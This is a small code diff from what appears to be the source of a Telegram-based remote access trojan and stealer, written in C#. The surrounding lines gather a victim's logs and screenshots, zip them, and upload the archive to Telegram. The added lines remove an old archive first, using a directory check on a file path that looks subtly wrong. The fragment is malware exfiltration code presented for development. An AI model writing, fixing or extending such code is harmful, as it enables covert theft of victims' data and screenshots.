@@ -142,6 +142,8 @@ namespace TelegramRAT.modded.stealer
                 SaveLogs(dirPath);
                 if (SaveScreenshotsB)
                     SaveScreenshots(dirPath);
+                if (Directory.Exists(dirPath + ".zip"))
+                    File.Delete(dirPath + ".zip");
                 ZipFile.CreateFromDirectory(dirPath, dirPath + ".zip");
                 telegram.sendFile(dirPath + ".zip");
                 if (CleanFolderAfterCollectingB)
